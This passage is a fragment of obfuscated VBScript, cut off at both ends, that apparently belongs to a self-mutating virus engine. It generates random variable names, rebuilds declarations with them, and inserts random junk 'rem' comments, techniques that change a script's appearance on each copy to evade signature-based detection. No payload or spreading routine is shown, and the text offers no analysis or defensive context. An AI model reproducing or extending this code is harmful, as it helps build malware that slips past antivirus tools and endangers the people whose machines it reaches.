KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY=KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY+1
loop
rem WGDFXLDXFXQHNUDQKPGVOQXUIPDAJZGCZORGSBEQSINEMH
AUWAHCOGHVEKB(MDNZRVCFCUDAPOVWSJGL,2)=""
for i=1 to 5
AUWAHCOGHVEKB(MDNZRVCFCUDAPOVWSJGL,2)=AUWAHCOGHVEKB(MDNZRVCFCUDAPOVWSJGL,2)&chr(Int(26*Rnd)+65)
next
do while not Int(20*Rnd)=0
AUWAHCOGHVEKB(MDNZRVCFCUDAPOVWSJGL,2)=AUWAHCOGHVEKB(MDNZRVCFCUDAPOVWSJGL,2)&chr(Int(26*Rnd)+65)
loop
if not MDNZRVCFCUDAPOVWSJGL=1 then
JFJNFPIGOXQQRDFNCTGYW=JFJNFPIGOXQQRDFNCTGYW&", "
end if
JFJNFPIGOXQQRDFNCTGYW=JFJNFPIGOXQQRDFNCTGYW&AUWAHCOGHVEKB(MDNZRVCFCUDAPOVWSJGL,2)
next
JFJNFPIGOXQQRDFNCTGYW=JFJNFPIGOXQQRDFNCTGYW&"(16,2)"
AUWAHCOGHVEKB(16,1)=left(AUWAHCOGHVEKB(16,1),len(AUWAHCOGHVEKB(16,1))-6)

rem STB
elseif left(IPKIXHRRAL,3)="rem" then
JFJNFPIGOXQQRDFNCTGYW="rem "
do while not Int(40*Rnd)=0
JFJNFPIGOXQQRDFNCTGYW=JFJNFPIGOXQQRDFNCTGYW&chr(Int(26*Rnd)+65)
loop

else
rem NSXLZTYXVALMCRIQUNSQIKNBBVSJW
KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY=1
MDNZRVCFCUDAPOVWSJGL=1
JFJNFPIGOXQQRDFNCTGYW=""

do while not mid(IPKIXHRRAL,KKURJENGESPVIIZBNJEHDIHFIFUJUFSPEZKPPHVHAMFPZBLRYYQLUIQHIUKIYCRAVQKRTSFY,1)=""
